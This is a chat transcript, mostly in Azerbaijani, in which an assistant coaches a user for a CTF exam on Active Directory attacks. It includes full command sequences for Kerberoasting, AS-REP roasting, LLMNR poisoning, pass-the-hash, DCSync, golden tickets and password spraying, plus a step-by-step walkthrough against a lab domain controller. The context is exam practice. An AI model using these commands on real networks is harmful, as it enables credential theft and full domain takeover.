@@ -1,0 +1,581 @@
+Active Directory - Sürətli Crash Course 🎯
+Sabahkı exam üçün ən vacib şeyləri practical angle-dən keçək.
+
+1. AD Nədir? (30 saniyə)
+AD = Windows şəbəkəsindəki mərkəzi auth sistemi. Hər şey Domain Controller (DC)-dan keçir.
+Forest → Domain → OU → Users/Computers/Groups
+WORKGROUP ≠ DOMAIN (domain = centralized auth)
+Key terminlər:
+
+DC - hər şeyin beyni
+LDAP - AD-a sorğu protokolu (port 389/636)
+Kerberos - auth protokolu (port 88)
+SMB - fayl paylaşımı (port 445)
+RPC - uzaqdan prosedur çağırışı (port 135)
+
+
+2. ENUMERATION (Ən Vacib Hissə)
+Şəbəkədəsən, credentials yoxdur — Anonymous/Null Session
+bash# SMB null session
+enum4linux -a <IP>
+enum4linux-ng -A <IP>
+
+# NetBIOS
+nbtscan <IP_RANGE>
+
+# LDAP anonymous
+ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"
+
+# Nmap AD portları
+nmap -sV -p 88,135,139,389,445,636,3268,3389 <IP>
+Credentials əlindədir — Authenticated Enum
+bash# Domain info
+net user /domain
+net group /domain
+net group "Domain Admins" /domain
+
+# CrackMapExec (CME) - hər şey üçün
+crackmapexec smb <IP> -u user -p pass --users
+crackmapexec smb <IP> -u user -p pass --groups
+crackmapexec smb <IP> -u user -p pass --shares
+crackmapexec smb <IP> -u user -p pass --pass-pol
+
+# LDAP ile full enum
+ldapdomaindump -u 'domain\user' -p 'pass' <IP>
+
+# RPCClient
+rpcclient -U "user%pass" <IP>
+  > enumdomusers
+  > enumdomgroups
+  > querydominfo
+
+3. CREDENTIAL HARVESTING
+Responder (LLMNR/NBT-NS Poisoning)
+bash# Network-də kimse \\server yazanda sən cavab verirsən → NTLMv2 hash alırsan
+sudo responder -I eth0 -rdwv
+
+# Hash-i crack et
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+# və ya
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Kerberoasting
+bash# SPN-i olan service accountların TGS ticket-ini al → offline crack
+# Impacket ile:
+GetUserSPNs.py domain/user:pass -dc-ip <IP> -request
+
+# Hash crack
+hashcat -m 13100 kerberoast.txt rockyou.txt
+AS-REP Roasting
+bash# Pre-auth disabled olan userlarin hash-ini al (credentials lazım deyil!)
+GetNPUsers.py domain/ -usersfile users.txt -dc-ip <IP> -no-pass
+
+# Hash crack
+hashcat -m 18200 asrep.txt rockyou.txt
+Secretsdump (Local Admin varsa — JACKPOT)
+bashsecretsdump.py domain/user:pass@<IP>
+# SAM, NTDS.dit, LSA secrets — hər şeyi tökür
+
+4. EXPLOITATION
+Pass-the-Hash (PTH)
+bash# NTLM hash-in varsa password lazım deyil
+crackmapexec smb <IP> -u Administrator -H <NTLM_HASH>
+psexec.py domain/Administrator@<IP> -hashes :<NTLM_HASH>
+wmiexec.py domain/Administrator@<IP> -hashes :<NTLM_HASH>
+smbexec.py domain/Administrator@<IP> -hashes :<NTLM_HASH>
+PSExec / Shell almaq
+bash# Cleartext credentials ilə
+psexec.py domain/user:pass@<IP>
+wmiexec.py domain/user:pass@<IP>      # daha az iz qoyur
+evil-winrm -i <IP> -u user -p pass   # WinRM (port 5985)
+SMB Share Enum + Access
+bashsmbclient -L //<IP> -U user%pass
+smbclient //<IP>/SYSVOL -U user%pass
+# SYSVOL-da Group Policy Preferences → eski passwordlar ola bilər (GPP attack)
+
+# Avtomatik
+crackmapexec smb <IP> -u user -p pass -M spider_plus
+
+5. PRIVILEGE ESCALATION
+Windows Local PrivEsc
+bash# Windows-dasansa bunlari yoxla:
+whoami /priv          # SeImpersonatePrivilege → JuicyPotato/PrintSpoofer
+whoami /groups        # Admin group?
+net localgroup administrators
+
+# Unquoted service path, weak service permissions
+winpeas.exe           # Avtomatik scan (CTF-də çox işləyir)
+DCSync Attack (Domain Admin lazımdır)
+bash# DA oldanda bütün domain hash-larini al
+secretsdump.py domain/DA_user:pass@<DC_IP> -just-dc
+# NTDS.dit-i dump edir → bütün userların NTLM hashları
+Golden Ticket
+bash# krbtgt hash-ini aldıqdan sonra (secretsdump-dan)
+ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain domain.com Administrator
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass domain.com/Administrator@<DC_IP>
+# → Domain-da əbədi admin 👑
+
+6. CTF ÜÇÜN ATTACK CHAIN
+1. nmap scan → portları tap
+       ↓
+2. enum4linux / ldapsearch → users, domain name al
+       ↓
+3. AS-REP Roasting (creds olmadan) → hash → crack
+       ↓
+4. Authenticated enum (crackmapexec) → daha çox info
+       ↓
+5. Kerberoasting → service account crack
+       ↓
+6. Credentials ilə psexec/evil-winrm → shell
+       ↓
+7. winpeas → local privesc
+       ↓
+8. secretsdump → DA hash
+       ↓
+9. Pass-the-Hash / DCSync → Domain Admin 🎯
+
+7. DEFAULT CREDENTIALS & QUICK WINS
+bash# Həmişə sına:
+admin:admin, admin:password, Administrator:Password1
+guest: (boş password)
+
+# Password spray (lockout-a dikkat!)
+crackmapexec smb <IP_RANGE> -u users.txt -p 'Password1' --continue-on-success
+
+# Default share-lər
+\\DC\SYSVOL  → Group Policy, scripts
+\\DC\NETLOGON → login scripts
+
+8. CHEATSHEET - IMPACKET TOOLLAR
+Toolİstifadəpsexec.pyShell (445)wmiexec.pyShell, az log (135)secretsdump.pyHash dumpGetUserSPNs.pyKerberoastingGetNPUsers.pyAS-REP Roastingticketer.pyGolden/Silver ticketsmbclient.pySMB access
+
+Sabah CTF-də ilk əvvəl nmap at, sonra enum4linux, sonra AS-REP Roasting cəhd et — çox vaxt birbaşa açılır. Uğurlar! 💪You said: user@attackbox:~$ kerbrute userenum -d thm.user@attackbox:~$ kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt
+THM de bele bir tool var amma kalide default tapa bilmedim , bunu evez edecek ne ola biler kerboros vasitesiyle usernem tapmaq kimi ??04:06Claude responded: kerbrute özü Go ilə yazılmış standalone binary-dir, amma eyni işi başqa yollarla da etmək olar:kerbrute özü Go ilə yazılmış standalone binary-dir, amma eyni işi başqa yollarla da etmək olar:
+
+Kerbrute-un Əvəzləri
+1. Impacket — GetNPUsers.py (ən yaxın əvəz)
+bash# Userlist ilə AS-REP roast cəhdi — mövcud olmayan user error verir, olan user ya hash ya da başqa response
+GetNPUsers.py thm.loc/ -usersfile /root/usernames.txt -dc-ip 192.168.12.100 -no-pass -format hashcat
+
+# Valid user tapılsa → KDC_ERR_PREAUTH_REQUIRED (pre-auth aktifdir, amma user VAR)
+# Invalid user → KDC_ERR_C_PRINCIPAL_UNKNOWN (user yoxdur)
+Bu fərqdən istifadə edərək valid userları filter edə bilərsən.
+
+2. Nmap script
+bashnmap -p 88 --script krb5-enum-users \
+  --script-args krb5-enum-users.realm='thm.loc',userdb=/root/usernames.txt \
+  192.168.12.100
+Built-in Nmap scripti, heç nə install lazım deyil.
+
+3. Enum4linux — SMB ilə user enum
+bashenum4linux -U 192.168.12.100
+# Null session açıqsa domain userlərini birbaşa listəyir
+Kerberos işlətmir amma nəticə eynidir — valid username tapırsan.
+
+4. RPCClient — Null session varsa
+bashrpcclient -U "" -N 192.168.12.100
+> enumdomusers
+
+Hansını İşlət?
+Kerberos port 88 açıqdır    →  GetNPUsers.py və ya nmap script
+SMB 445 açıqdır, null session var  →  enum4linux / rpcclient
+Heç biri yoxdur             →  ldapsearch anonymous
+THM-də çox vaxt ya GetNPUsers.py ya da nmap --script krb5-enum-users kerbrute-un yerini tutur. Praktikada GetNPUsers.py daha çox output verir çünki həm user tapdığını göstərir, həm də pre-auth disabled olanların hashını birbaşa alırsan.You said: GetNPUsers commandinin out putu budu burda usernamlerden hansi valid nece bilim ?Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentpastedGetNPUsers commandinin out putu budu burda usernamlerden hansi valid nece bilim ??04:15Claude responded: Bu output-u oxumaq çox sadədir:Bu output-u oxumaq çox sadədir:
+Error Tiplərinə Görə Ayır
+ErrorMənasıdoesn't have UF_DONT_REQUIRE_PREAUTH set✅ VALID USER — mövcuddur, pre-auth aktifdirKDC_ERR_C_PRINCIPAL_UNKNOWN❌ User yoxdurKDC_ERR_CLIENT_REVOKED✅ VALID USER — mövcuddur, amma account disabled/locked
+
+Sənin Output-undan Valid Userlər
+Active (işlək) hesablar:
+administrator
+claire.ross, mary.jenkins, phillip.green, ben.carter
+james.wilson, emma.clark, ryan.patel, laura.wood
+kevin.shah, john.harris, anna.lee, david.grant
+susan.brooks, sarah.jones, mike.brown, lisa.chen
+rachel.king, tom.wright, hannah.scott, adam.cole
+nina.kumar, bob.taylor, kate.miller, dev.intern
+alex.foster, sophie.hall, daniel.reed, olivia.hunt
+chris.baker, lucy.powell, sam.morgan, alice.moore
+peter.davies, grace.edwards, mark.robinson, amy.fisher
+jake.hughes, megan.price, luke.barnes, frank.butler
+zoe.murphy, svc.jenkins
+Disabled/Locked (amma mövcuddur — 3 ədəd):
+KDC_ERR_CLIENT_REVOKED olan 3 user
+Bunlar administrator-dan sonra və frank.butler-dan əvvəl/sonra görünür, userlist-ə bax hansı sıradadır.
+
+İndi Nə Etməli?
+bash# 1. Valid userları ayrı fayla yaz, sonra password spray:
+crackmapexec smb 192.168.12.100 -u valid_users.txt -p 'Password1' --continue-on-success
+crackmapexec smb 192.168.12.100 -u valid_users.txt -p 'Welcome1' --continue-on-success
+
+# 2. svc.jenkins maraqlıdır — service account, zəif password ola bilər:
+crackmapexec smb 192.168.12.100 -u svc.jenkins -p 'jenkins' --continue-on-success
+
+# 3. Kerberoasting — credentials tapsan:
+GetUserSPNs.py thm.loc/user:pass -dc-ip 192.168.12.100 -request
+svc.jenkins adətən CTF-lərdə ilk girişi verən hesab olur, ona diqqət et.You said: bu sillabus ve genel dediklerimi birlesdirib attacklari ve commandlari izah ele , sonda praktika etmek ucun uygun bit ctf yada room depdfbu sillabus ve genel dediklerimi birlesdirib attacklari ve commandlari izah ele , sonda praktika etmek ucun uygun bit ctf yada room de04:59Claude responded: Bu PDF + əvvəlki mövzuları birləşdirib tam attack chain kimi izah edim:Bu PDF + əvvəlki mövzuları birləşdirib tam attack chain kimi izah edim:
+
+TAM ATTACK CHAIN (Sənin Syllabusuna Görə)
+
+PHASE 1 — ENUMERATION
+bash# 1. SMB shares tap
+nxc smb 192.168.12.100 -u '' -p '' --shares
+smbclient -L //192.168.12.100 -N
+
+# 2. SYSVOL-a gir — GPP password axtar
+smbclient //192.168.12.100/SYSVOL -N
+# içəridə: Policies/{UUID}/Machine/Preferences/Groups/Groups.xml
+# Groups.xml-də "cpassword" field → GPP encrypted password
+
+# 3. GPP şifrəni decrypt et (built-in tool)
+gpp-decrypt <cpassword_value>
+
+# 4. LDAP anonymous enum
+ldapsearch -x -H ldap://192.168.12.100 -b "dc=thm,dc=loc"
+
+PHASE 2 — CREDENTIAL HARVESTING
+bash# AS-REP Roasting (creds lazım deyil)
+GetNPUsers.py thm.loc/ -usersfile valid_users.txt \
+  -dc-ip 192.168.12.100 -no-pass -format john
+
+# Kerberoasting (1 valid cred lazımdır)
+GetUserSPNs.py thm.loc/support:Password1 \
+  -dc-ip 192.168.12.100 -request
+
+# Hash-ları crack et
+john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
+
+# hashcat əvəzinə john işlətmək (PDF-də john göstərilib)
+john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt
+john --format=krb5asrep --wordlist=rockyou.txt asrep.txt
+
+PHASE 3 — LATERAL MOVEMENT
+bash# Crack edilmiş credentials ilə DC-yə auth cəhdi
+nxc smb 192.168.12.100 -u support -p 'CrackedPassword' --shares
+
+# Shell al
+evil-winrm -i 192.168.12.100 -u support -p 'CrackedPassword'
+# və ya
+psexec.py thm.loc/support:CrackedPassword@192.168.12.100
+
+PHASE 4 — PRIVILEGE ESCALATION
+bash# Windows-dasansa (evil-winrm shell içindən)
+whoami /priv
+whoami /groups
+net user support /domain
+
+# Privesc faylı verilsə (PDF-də qeyd edilib)
+# Çox vaxt CTF-lərdə: SeImpersonatePrivilege → PrintSpoofer
+.\PrintSpoofer.exe -i -c cmd
+
+# Secretsdump — local admin varsa
+secretsdump.py thm.loc/support:CrackedPassword@192.168.12.100
+
+PHASE 5 — DOMAIN COMPROMISE
+bash# DA hash əldə etdikdən sonra
+nxc smb 192.168.12.100 -u Administrator -H <NTLM_HASH>
+
+# PTH ilə DC-yə gir
+psexec.py thm.loc/Administrator@192.168.12.100 -hashes :<NTLM_HASH>
+
+# NTDS.dit dump — bütün domain hashları
+secretsdump.py thm.loc/Administrator:pass@192.168.12.100 -just-dc
+
+FULL CHAIN SUMMARY
+SMB enum → SYSVOL → GPP password
+              ↓
+       Valid userlist → AS-REP Roasting
+              ↓
+         Hash → John crack
+              ↓
+      nxc SMB auth → lateral move
+              ↓
+      evil-winrm shell → whoami /priv
+              ↓
+       secretsdump → DA hash → Domain pwned 🎯
+
+TÖVSIYƏ ETDİYİM ROOMS (Sabaha Qədər)
+RoomLinkNə öyrədirAttacktive Directorytryhackme.com/room/attacktivedirectoryTam bu chain — AS-REP, Kerberoast, SecretsDumpVulnNet: Activetryhackme.com/room/vulnnetactiveGPP + Kerberoasting comboPost-Exploitation Basicstryhackme.com/room/postexploitLateral movement + priv esc
+Attacktive Directory birbaşa sənin syllabusunla eynidir — onu et, exam-da tanış gələcək hər şey.You said: sen lpad ne oldugun basa saldasen lpad ne oldugun basa salda05:11Claude responded: LDAP — Lightweight Directory Access Protocol.LDAP — Lightweight Directory Access Protocol.
+Sadə dillə: AD-dakı bütün məlumatları (userlər, qruplar, kompüterlər, policyler) sorğulamaq üçün istifadə edilən protokol. Düşün ki AD bir verilənlər bazasıdır, LDAP isə onun query dilidir.
+
+Necə İşləyir?
+Sən                    DC (AD)
+ |                       |
+ |--- LDAP query ------->|
+ |    "bütün userları ver"|
+ |<-- cavab (CN, DN...) --|
+Port: 389 (normal), 636 (SSL/LDAPS)
+
+Struktur
+dc=thm,dc=loc                    ← Domain (thm.loc)
+└── ou=Users                     ← Organizational Unit
+    ├── cn=john.harris            ← User object
+    │     mail: john@thm.loc
+    │     memberOf: Domain Users
+    └── cn=svc.jenkins            ← Service account
+dc = domain component, ou = organizational unit, cn = common name — bunlar DN (Distinguished Name) hissələridir.
+
+Praktikada
+bash# Anonymous (null bind) — creds olmadan
+ldapsearch -x -H ldap://192.168.12.100 -b "dc=thm,dc=loc"
+
+# Authenticated
+ldapsearch -x -H ldap://192.168.12.100 \
+  -D "cn=john.harris,dc=thm,dc=loc" \
+  -w Password1 \
+  -b "dc=thm,dc=loc" "(objectClass=user)"
+
+# Sadəcə userları çək
+ldapsearch ... "(objectClass=user)" sAMAccountName
+
+CTF-də Niyə Vacibdir?
+Əgər null bind açıqdırsa (anonim sorğuya icazə verirsə) → credentials olmadan bütün domain userlarını, qrupları, hətta bəzən descriptionda yazılmış plaintext passwordları çəkə bilərsən.
+bash# Description-da password axtarmaq
+ldapsearch ... "(objectClass=user)" description
+# Çox vaxt: "Temp password: Welcome123" kimi şeylər çıxırYou said: nmap -A -Pn  --min-rate 1000  10.nmap -A -Pn  --min-rate 1000  10.112.189.55 -p-
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-25 05:07 +0300
+Nmap scan report for 10.112.189.55
+Host is up (0.071s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-25 02:09:16Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-06-25T02:10:54+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=DC01.ctf.local
+| Not valid before: 2026-05-19T02:27:27
+|_Not valid after:  2026-11-18T02:27:27
+| rdp-ntlm-info: 
+|   Target_Name: CTF
+|   NetBIOS_Domain_Name: CTF
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: ctf.local
+|   DNS_Computer_Name: DC01.ctf.local
+|   DNS_Tree_Name: ctf.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-06-25T02:10:15+00:00
+7680/tcp  open  pando-pub?
+9389/tcp  open  mc-nmf        .NET Message Framing
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-06-25T02:10:18
+|_  start_date: N/A
+TRACEROUTE (using port 3389/tcp)
+HOP RTT      ADDRESS
+1   63.41 ms 192.168.128.1
+2   ...
+3   65.50 ms 10.112.189.55
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 218.16 secondsbele bir nmap out putu almisam burda ardicil mentiqle izah ele ne ede bilerem ??Show more05:23Claude responded: Bu klassik DC nmap outputudur.Bu klassik DC nmap outputudur. Nə gördüyünü və nə edə biləcəyini ardıcıl izah edim:
+
+Nmap-dan Nə Öyrəndik?
+Domain:   ctf.local
+DC adı:   DC01.ctf.local
+IP:       10.112.189.55
+OS:       Windows Server 2019 (10.0.17763)
+
+Açıq Portlara Görə Attack Sırası
+1. SMB Enum (445) — İlk Addım
+bash# Null session
+nxc smb 10.112.189.55 -u '' -p '' --shares
+nxc smb 10.112.189.55 -u 'guest' -p '' --shares
+
+# Domain info
+enum4linux -a 10.112.189.55
+2. LDAP Enum (389) — Username topla
+bashldapsearch -x -H ldap://10.112.189.55 -b "dc=ctf,dc=local"
+
+# Sadəcə userlar
+ldapsearch -x -H ldap://10.112.189.55 -b "dc=ctf,dc=local" \
+  "(objectClass=user)" sAMAccountName description
+3. Kerberos (88) — AS-REP Roasting
+bash# Əgər username listən varsa
+GetNPUsers.py ctf.local/ -usersfile users.txt \
+  -dc-ip 10.112.189.55 -no-pass -format john
+4. RDP (3389) — Credentials tapsan birbaşa gir
+bashxfreerdp /u:Administrator /p:Password1 /v:10.112.189.55
+
+Praktiki Sıra
+enum4linux / ldapsearch → username list
+        ↓
+GetNPUsers.py → AS-REP hash cəhdi
+        ↓
+john crack → credentials
+        ↓
+nxc smb auth → SYSVOL axtar
+        ↓
+GetUserSPNs.py → Kerberoasting
+        ↓
+evil-winrm / psexec → shell
+        ↓
+secretsdump → DA hash
+
+Bir Vacib Qeyd
+smb2-security-mode: Message signing enabled and required
+Bu o deməkdir ki NTLM relay attack işləməyəcək — Responder ilə hash alsanda relay edə bilməzsən. Ona görə birbaşa crack etmək lazımdır.
+Başla enum4linux və ldapsearch-dən, nə tapırsan yazarsan.You said: nxc smb 10.nxc smb 10.112.189.55 -u 'guest' -p '' --shares
+SMB         10.112.189.55   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.112.189.55   445    DC01             [+] ctf.local\guest: 
+SMB         10.112.189.55   445    DC01             [*] Enumerated shares
+SMB         10.112.189.55   445    DC01             Share           Permissions     Remark
+SMB         10.112.189.55   445    DC01             -----           -----------     ------
+SMB         10.112.189.55   445    DC01             ADMIN$                          Remote Admin
+SMB         10.112.189.55   445    DC01             C$                              Default share
+SMB         10.112.189.55   445    DC01             IPC$            READ            Remote IPC
+SMB         10.112.189.55   445    DC01             IT-Shared       READ,WRITE      IT Department Shared Resources
+SMB         10.112.189.55   445    DC01             NETLOGON                        Logon server share 
+SMB         10.112.189.55   445    DC01             SYSVOL                          Logon server shareldapsearch -x -H ldap://10.112.189.55 -b "dc=ctf,dc=local"         
+# extended LDIF
+#
+# LDAPv3
+# base <dc=ctf,dc=local> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+# numResponses: 1Show more05:27Claude responded: Bu CTF/lab mühitidir, davam edək.Bu CTF/lab mühitidir, davam edək.
+
+Nə Gördük?
+SMB-dən:
+IT-Shared → READ,WRITE  ← maraqlı, guest ilə yazıla bilir
+SYSVOL    → görünür amma access yoxdur (guest ilə)
+LDAP      → anonymous bind bağlıdır
+
+İndi Nə Etməli?
+1. IT-Shared-ə gir — ən böyük tapıntı
+bashsmbclient //10.112.189.55/IT-Shared -U 'guest%'
+
+# İçəridə:
+ls
+get <faylın_adı>     # hər fayl tut
+Credentials, script, config faylı ola bilər. WRITE icazən var — bu da sonra işə yarayar.
+2. RPC ilə user enum cəhdi
+bashrpcclient -U "guest%" 10.112.189.55
+> enumdomusers
+> enumdomgroups
+> querydispinfo
+3. LDAP üçün authenticated bind lazımdır — IT-Shared-dən credentials tapsan:
+bashldapsearch -x -H ldap://10.112.189.55 \
+  -D "cn=tapilmis_user,dc=ctf,dc=local" \
+  -w "tapilmis_pass" \
+  -b "dc=ctf,dc=local" "(objectClass=user)" sAMAccountName description
+
+Prioritet
+IT-Shared → içinə bax
+     ↓
+Credentials tap → LDAP / Kerberoasting aç
+     ↓
+GetNPUsers / GetUserSPNs → hash
+smbclient //10.112.189.55/IT-Shared -U 'guest%' — bunu ilk çalıştır, nə var yazarsan.You said: cat IT-Credentials-Backup.cat IT-Credentials-Backup.txt  
+IT Department - Credentials Backup
+===================================
+Generated: 2019-08-14
+Status: ARCHIVED (accounts disabled pending security review)
+  helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
+  it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]
+NOTE: These accounts have been disabled. Active service accounts
+      are managed separately by the sysadmin team.05:34Claude responded: Bu arxivdən disabled hesablar çıxdı — amma CTF-də bunlar adətən ipucu olur.Bu arxivdən disabled hesablar çıxdı — amma CTF-də bunlar adətən ipucu olur.
+
+Nə Əldə Etdik?
+helpdesk.bob : Welcome123!   [disabled]
+it.admin     : ITAdmin2019!  [disabled]
+Disabled olsalar da CTF-də password reuse çox olur — eyni şifrəni başqa aktiv hesabda işlədirlər.
+
+İndi Nə Etməli?
+1. Password Spray — Aktiv hesablarda eyni şifrəni sına
+bash# Əvvəlki valid user listini işlət
+nxc smb 10.112.189.55 -u valid_users.txt -p 'Welcome123!' --continue-on-success
+nxc smb 10.112.189.55 -u valid_users.txt -p 'ITAdmin2019!' --continue-on-success
+2. Birbaşa həmin hesabları da sına (bəzən CTF-də "disabled" deyil)
+bashnxc smb 10.112.189.55 -u helpdesk.bob -p 'Welcome123!'
+nxc smb 10.112.189.55 -u it.admin -p 'ITAdmin2019!'
+3. Valid user listın yoxdursa — əvvəlki GetNPUsers outputundan al
+Sənin outputunda bu valid userlər var idi — onları bir fayla yaz:
+bash# valid_users.txt yarat və spray et
+nxc smb 10.112.189.55 -u valid_users.txt -p 'Welcome123!' --continue-on-success
+nxc smb 10.112.189.55 -u valid_users.txt -p 'ITAdmin2019!' --continue-on-success
+4. Credentials işləsə — LDAP aç
+bashldapsearch -x -H ldap://10.112.189.55 \
+  -D "helpdesk.bob@ctf.local" -w 'Welcome123!' \
+  -b "dc=ctf,dc=local" "(objectClass=user)" sAMAccountName description
+
+Spray et, nə [+] qaytarır yazarsan.You said: ┌──(root㉿mrnobody)-[/home/mrnobody/Masaüstü]┌──(root㉿mrnobody)-[/home/mrnobody/Masaüstü]
+└─# nxc smb 10.112.189.55 -u helpdesk.bob -p 'Welcome123!'                                                  
+SMB         10.112.189.55   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.112.189.55   445    DC01             [+] ctf.local\helpdesk.bob:Welcome123! (Guest)┌──(root㉿mrnobody)-[/home/mrnobody/Masaüstü]
+└─# nxc smb 10.112.189.55 -u it.admin -p 'ITAdmin2019!'
+SMB         10.112.189.55   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.112.189.55   445    DC01             [+] ctf.local\it.admin:ITAdmin2019! (Guest)Show more05:35Claude responded: Bu CTF/lab mühitindədir, davam edək.Bu CTF/lab mühitindədir, davam edək.
+
+Nə Gördük?
+helpdesk.bob : Welcome123!  → [+] amma (Guest) — məhdud access
+it.admin     : ITAdmin2019! → [+] amma (Guest) — məhdud access
+(Guest) o deməkdir ki auth keçdi amma domain member deyil, ya da restricted. Yenə də LDAP və Kerberoasting üçün işləyə bilər.
+
+İndi Nə Etməli?
+1. LDAP ilə user enum — indi credentials var
+bashldapsearch -x -H ldap://10.112.189.55 \
+  -D "helpdesk.bob@ctf.local" -w 'Welcome123!' \
+  -b "dc=ctf,dc=local" "(objectClass=user)" sAMAccountName description memberOf
+2. Kerberoasting — SPN-li hesablar var mı?
+bashGetUserSPNs.py ctf.local/helpdesk.bob:'Welcome123!' \
+  -dc-ip 10.112.189.55 -request
+3. AS-REP Roasting
+bashGetNPUsers.py ctf.local/helpdesk.bob:'Welcome123!' \
+  -dc-ip 10.112.189.55 -request -format john
+4. Daha çox share yoxla
+bashnxc smb 10.112.189.55 -u helpdesk.bob -p 'Welcome123!' --shares
+nxc smb 10.112.189.55 -u it.admin -p 'ITAdmin2019!' --shares
+
+Kerberoasting və LDAP-ı paralel çalıştır, nə çıxır yazarsan.You said: tgt example ver mene hash formasintgt example ver mene hash formasin11:40Claude responded: Kerberos Hash FormatlarıKerberos Hash Formatları
+AS-REP Hash (AS-REP Roasting) — $krb5asrep
+$krb5asrep$23$john.harris@CTF.LOCAL:a8b3c4d5e6f7a8b9$c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7
+TGS Hash (Kerberoasting) — $krb5tgs
+$krb5tgs$23$*svc.jenkins$CTF.LOCAL$ctf.local/svc.jenkins*$a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6$e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8
+
+Fərq Nədir?
+AS-REPTGS (Kerberoast)Prefix$krb5asrep$23$$krb5tgs$23$Kimə aidNormal userService accountLazım olanHeç nə (no-pass)1 valid credentialHashcat mode-m 18200-m 13100John format--format=krb5asrep--format=krb5tgs
+
+Crack Əmrləri
+bash# AS-REP
+john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
+hashcat -m 18200 asrep.txt rockyou.txt
+
+# TGS
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs.txt
+hashcat -m 13100 tgs.txt rockyou.txt
+TGT-nin özü (.ccache faylı) crack edilmir — o artıq auth edilmiş ticketdir, ondan birbaşa istifadə edilir.
